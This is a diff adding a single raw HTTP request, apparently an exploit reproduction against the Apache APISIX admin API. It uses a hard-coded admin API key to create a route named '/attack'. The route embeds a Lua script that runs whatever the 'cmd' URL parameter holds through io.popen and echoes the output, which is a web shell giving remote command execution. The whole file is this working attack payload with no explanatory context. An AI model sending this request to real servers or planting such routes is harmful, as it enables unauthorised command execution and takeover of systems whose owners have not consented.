@@ -1,0 +1,21 @@
+POST /apisix/admin/routes HTTP/1.1
+Host: 10.10.3.128
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+Connection: close
+X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
+Content-Type: application/json
+Content-Length: 406
+
+{
+    "uri": "/attack",
+"script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
+    "upstream": {
+        "type": "roundrobin",
+        "nodes": {
+            "example.com:80": 1
+        }
+    }
+}
